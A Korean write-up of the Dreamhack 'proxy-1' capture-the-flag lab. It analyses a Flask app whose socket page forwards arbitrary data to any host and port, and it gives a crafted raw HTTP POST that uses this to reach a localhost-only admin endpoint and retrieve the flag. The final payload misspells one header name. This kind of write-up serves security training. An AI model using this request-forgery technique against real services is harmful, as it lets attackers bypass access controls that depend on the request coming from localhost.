# [Dreamhack Wargame] proxy-1
* 출처: 🚩 proxy-1 [🔗](https://dreamhack.io/wargame/challenges/13/)
* Reference: HTTP POST 메소드
* 문제 설명
  <br/><br/>
  <img width="1068" alt="proxy-1_문제 설명" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/80cfd06d-55d5-434f-b4a4-bb087de63238">

<br/><br/>

## 문제 파일(app.py) 및 취약점 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

# index(/) 페이지
@app.route('/')
def index():
    return render_template('index.html')

# socket 페이지: host, port, data를 입력 받아 해당 host에 port에 해당하는 포트로 연결을 생성하고 data를 전송하고 그에 대한 응답을 화면에 출력함
@app.route('/socket', methods=['GET', 'POST'])
def login():
    if request.method == 'GET': # GET 메소드로 요청 시
        return render_template('socket.html') # 이용자에게 host, port, data를 입력 받는 페이지(socket.html)를 화면에 출력함
    elif request.method == 'POST': # POST 메소드로 요청 시
    
        # 이용자가 입력한 host, port, data의 입력값을 가져옴
        host = request.form.get('host')
        port = request.form.get('port', type=int) # port 입력값은 int 타입(정수)으로 가져옴
        data = request.form.get('data')

        retData = ""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port)) # host, port 정보로 연결 생성
                s.sendall(data.encode()) # 연결이 생성되면 data를 인코딩하여 전송함
                while True:
                    tmpData = s.recv(1024)
                    retData += tmpData.decode()
                    if not tmpData: break
            
        except Exception as e:
            return render_template('socket_result.html', data=e) # 에러 발생 시 해당 에러를 화면에 출력함
        
        return render_template('socket_result.html', data=retData) # 요청에 대한 응답 내용을 화면에 출력함


# admin 페이지 (POST 메소드만 허용됨)
@app.route('/admin', methods=['POST'])
def admin():
    # 플래그 획득을 위해 만족해야 하는 조건
    if request.remote_addr != '127.0.0.1': # 1) 클라이언트 ip가 127.0.0.1인지 확인함 (Host: 127.0.0.1)
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser': # 2) 요청의 User-Agent 헤더 값이 Admin Browser인지 확인함 (User-Agent: Admin Browser)
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin': # 3) 요청의 DreamhackUser 헤더 값이 admin인지 확인함 (DreamhackUser: admin)
        return 'Only Admin'

    if request.cookies.get('admin') != 'true': # 4) 요청의 admin 쿠키의 값이 true인지 확인함 (Cookie: admin=true)
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin': # 5) POST 요청의 Body에 userid 파라미터 값으로 admin을 주고 있는지 확인함 (userid=admin)
        return 'Admin id'

    return FLAG # 위의 5개의 조건을 모두 만족하면 플래그 획득

app.run(host='0.0.0.0', port=8000) # 플라스크에서 8000번 포트로 실행 → 사이트의 port에 8000을 입력함
```
* socket 페이지에서 이용자의 입력값에 대해 어떠한 검사도 수행하지 않은 채 입력 받은 host와 port로 연결을 생성하고 data를 전송함
  - 문제 사이트의 host(```127.0.0.1```)과 port(```8000```)를 입력하고 Data에 Request를 작성하여 [Send] 버튼을 누르면 요청이 전송되어 그에 대한 응답을 화면에서 확인할 수 있음
    - /admin에는 POST 메소드만 허용되며, 코드에 명시된 5개의 조건을 모두 만족해야 FLAG를 획득할 수 있음
        + 조건에 따른 header와 body 값
            | 조건 | Data 내에 포함되어야 하는 값 |
            |:---:|------|
            | 1번 조건 | Host: 127.0.0.1 |
            | 2번 조건 | User-Agent: Admin Browser |
            | 3번 조건 | DreamhackUser: admin |
            | 4번 조건 | Cookie: admin=true |
            | 5번 조건 | userid=admin *→ ⚠️ POST 요청의 Body는 헤더와 빈 줄 하나로 구분됨에 주의* |
        + 📌 POST 메소드로 요청 시 반드시 포함해야 하는 헤더들
            | 헤더 | 설명 |
            |:---:|------|
            | ```Content-Type``` | POST 요청의 Body 내 데이터에 대한 타입을 해당 헤더의 값으로 명시해주어야 함 <br/> → ```userid=admin```은 ```key1=value1&key2=value2```의 형식이므로 <br/> &nbsp;&nbsp; ```application/x-www-form-urlencoded```를 헤더의 값으로 주어야 함 |
            | ```Content-Length``` | POST 요청의 Body 내 데이터의 길이를 해당 헤더의 값으로 명시해주어야 함 <br/> → ```userid=admin```의 길이는 ```12```이므로 헤더의 값은 ```12```가 됨 |


<br/><br/>

## 문제 풀이 (익스플로잇)
socket 페이지에서 host, port, Data에 아래와 같이 입력하고 [Send] 버튼을 클릭하면 플래그를 획득할 수 있음
<br/><br/>
<img width="2560" alt="proxy-1_익스플로잇" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/ac86df3b-9c03-4c11-9c52-3a83b09851ae"><br/>

* socket 페이지의 각 항목의 입력값
    | 항목 | host | port | Data |
    |:---:|----|----|----|
    | **사용자 입력값** | 127.0.0.1 | 8000 | POST /admin HTTP/1.1 <br/> Host: 127.0.0.1 <br/> User-Agent: Admin Browser <br/> DreamhackUser: admin <br/> Cookie:admin=true <br/> Content-Type: application/x-www-form-urlencoded <br/> Contnet-Length: 12 <br/><br/> userid=admin |


